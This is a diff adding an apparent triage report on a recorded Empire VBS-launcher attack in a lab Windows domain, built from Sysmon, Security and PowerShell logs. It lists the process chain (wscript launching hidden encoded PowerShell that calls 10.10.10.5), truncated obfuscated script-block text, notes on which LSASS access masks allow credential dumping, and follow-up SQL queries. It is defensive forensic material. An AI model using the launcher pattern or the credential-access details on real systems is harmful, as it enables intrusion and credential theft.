@@ -1,0 +1,108 @@
+# Triage — empire_launcher_vbs
+
+Events:    2067 over 5 channels
+Window:    2020-09-04 20:09:40.845 -> 2020-09-04 20:10:49.124 (UTC)
+Hosts:     MORDORDC.theshire.local, WORKSTATION5.theshire.local, WORKSTATION6.theshire.local
+
+## What was recorded (top 15)
+
+  channel                                   event id  what it is                    events
+  Microsoft-Windows-Sysmon/Operational            12  registry key created/deleted     420
+  Microsoft-Windows-Sysmon/Operational             7  image loaded                     324
+  Microsoft-Windows-Sysmon/Operational            10  process access                   324
+  Security                                      4658  handle closed                    223
+  Windows PowerShell                             800  PowerShell pipeline              126
+  Security                                      4656  handle requested                 112
+  Security                                      4690                                   112
+  Security                                      4663  object access                     96
+  Microsoft-Windows-PowerShell/Operational      4103  PowerShell module logging         87
+  Microsoft-Windows-Sysmon/Operational            13  registry value set                63
+  Security                                      5156  connection allowed                40
+  Security                                      5158                                    35
+  Microsoft-Windows-Sysmon/Operational            11  file created                      22
+  Security                                      4703                                    11
+  Microsoft-Windows-Sysmon/Operational             3  network connection                10
+
+## Process tree (Sysmon 1, falling back to Security 4688)
+
+5 process creations.
+
+  wscript.exe (2440)  "C:\windows\System32\WScript.exe" "C:\Users\pgustavo\Desktop\launcher.vbs"    [parent: explorer.exe (5728), not in this dataset]
+      └── powershell.exe (2316)  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noP -sta -w 1 -enc  SQBmACgAJABQAF…
+          └── conhost.exe (7700)  \??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1
+          └── whoami.exe (9152)  "C:\windows\system32\whoami.exe"
+  wmiprvse.exe (4864)  C:\windows\system32\wbem\wmiprvse.exe -secured -Embedding   [parent: svchost.exe (884), not in this dataset]
+
+## Parent -> child pairs (rare = seen in at most 2 datasets)
+
+  parent          child           here  other datasets
+  explorer.exe    wscript.exe        1               0
+  powershell.exe  conhost.exe        1               0
+  powershell.exe  whoami.exe         1               0
+  svchost.exe     wmiprvse.exe       1               0
+  wscript.exe     powershell.exe     1               0
+
+  'other datasets' counts the other recordings in ep.win_events with the same pair: a pair nobody else has
+  is either the attack or something specific to this lab.
+
+## Command lines worth reading
+
+  time (UTC)               image           command line                                                                              why
+  2020-09-04 20:09:57.060  powershell.exe  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noP -sta -w 1 -enc  SQBmAC…  encoded PowerShell, hidden or unrestricted PowerShell
+
+## LOLBin execution
+
+  time (UTC)               binary       started by    command line
+  2020-09-04 20:09:55.953  wscript.exe  explorer.exe  "C:\windows\System32\WScript.exe" "C:\Users\pgustavo\Desktop\launcher…
+
+## Network connections per process (Sysmon 3)
+
+  process                                    destination       port  hostname  connections
+  lsass.exe                                  0:0:0:0:0:0:0:1    389                      2
+  microsoft.activedirectory.webservices.exe  0:0:0:0:0:0:0:1    389                      2
+  dns.exe                                    172.18.39.5      63162                      1
+  dns.exe                                    40.90.4.2           53                      1
+  lsass.exe                                  172.18.38.5      49674                      1
+  msmpeng.exe                                104.40.17.153      443                      1
+  powershell.exe                             10.10.10.5          80                      1
+  svchost.exe                                172.18.38.5        135                      1
+
+## Persistence and configuration changes
+
+Registry keys used for persistence or execution control:
+  process       key                                                    value               n
+  services.exe  HKLM\System\CurrentControlSet\Services\WdNisDrv\Start  DWORD (0x00000003)  3
+
+Services and scheduled tasks (Security 4697/4698/4699/4702, System 7045):
+  (none)
+
+## Credential access (Sysmon 10 against LSASS)
+
+  source process  granted access  times  routine?  call trace starts
+  svchost.exe     0x1000              2  routine   C:\windows\SYSTEM32\ntdll.dll+9c534|C:\windows\System32\KERN
+
+  0x1000/0x1400 only query a process; masks such as 0x1010, 0x1410 or 0x143a allow reading its memory,
+  which is what credential dumping needs.
+
+## Defence evasion
+
+Log clearing (Security 1102, System 104):
+  (none)
+
+Files deleted by the processes that created them (Sysmon 23/26):
+  process         file                                                                         n
+  powershell.exe  C:\Users\pgustavo\AppData\Local\Temp\__PSScriptPolicyTest_hz532hbm.mwe.psm1  1
+  powershell.exe  C:\Users\pgustavo\AppData\Local\Temp\__PSScriptPolicyTest_4jth5k1f.rm3.ps1   1
+
+## PowerShell script blocks (4104)
+
+  time (UTC)               user               chars  script starts with
+  2020-09-04 20:10:00.327  THESHIRE\pgustavo   1899  If($PSVERSiOnTaBlE.PSVErSIOn.MajOR -gE 3){$6866=[rEF].ASsEMbLY.GetTYPE('System.Mana…
+
+## Where to look next
+
+ 1. LOLBin wscript.exe started by explorer.exe at 2020-09-04 20:09:55.953: SELECT ts, event_id, image, target_filename, destination_ip FROM ep.win_events WHERE dataset='empire_launcher_vbs' AND process_guid='{860ba2e3-9f13-5f52-2603-000000000400}' ORDER BY ts
+ 2. Read the full command lines: SELECT ts, image, command_line FROM ep.win_events WHERE dataset='empire_launcher_vbs' AND event_id IN (1,4688) ORDER BY ts
+ 3. powershell.exe connected to 10.10.10.5:80 — a script interpreter making its own connections: SELECT ts, image, command_line, destination_ip, destination_port FROM ep.win_events WHERE dataset='empire_launcher_vbs' AND event_id=3 AND positionCaseInsensitive(image, 'powershell.exe') > 0 ORDER BY ts
+ 4. Persistence: SELECT ts, image, target_object, details FROM ep.win_events WHERE dataset='empire_launcher_vbs' AND event_id IN (12,13,14) AND match(target_object, 'Run|Services|Winlogon')
+ 5. Read a script block in full: SELECT script_block FROM ep.win_events WHERE dataset='empire_launcher_vbs' AND event_id=4104 ORDER BY length(script_block) DESC LIMIT 1
